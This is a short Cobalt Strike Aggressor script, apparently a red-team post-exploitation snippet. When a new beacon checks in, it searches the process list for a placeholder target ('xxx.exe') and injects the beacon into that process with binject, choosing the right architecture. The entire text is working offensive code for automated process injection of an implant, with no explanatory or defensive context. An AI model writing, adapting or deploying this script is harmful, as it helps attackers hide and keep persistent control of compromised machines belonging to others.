```
on beacon_initial{ sub callback{  $regex = '(.*\n)+xxx.exe\t\d+\t(\d+)(.*\n)+';  $listener = "xxx";  if ($2  ismatch $regex)  {   $pid = matched()[1];   $inject_pid = $pid;   if (-is64 $1)   {    $arch = "x64";   }   else   {    $arch = "x86";   }   binject($1, $pid, $listener, $arch);  } } if($inject_pid != beacon_info($1,"pid")) {  bps($1, &callback); }}
```
